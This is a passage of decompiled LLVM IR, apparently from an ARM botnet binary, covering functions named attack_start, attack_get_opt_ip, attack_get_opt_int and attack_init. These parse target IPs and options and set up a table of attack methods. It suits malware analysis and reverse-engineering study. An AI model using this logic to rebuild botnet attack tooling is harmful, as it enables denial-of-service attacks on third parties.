  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_135dc.33 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_135dc.33 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 0, 4, 5, 1, 2, 3, 9, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_22458.29 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2245c.31 to i32), i32* @r6, align 4
  store i32 47272, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_22459.37 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_2245c.31, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 47272, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 47272, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_22459.37 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_bd94.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_22459.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_2245c.31, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_bd94.39 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
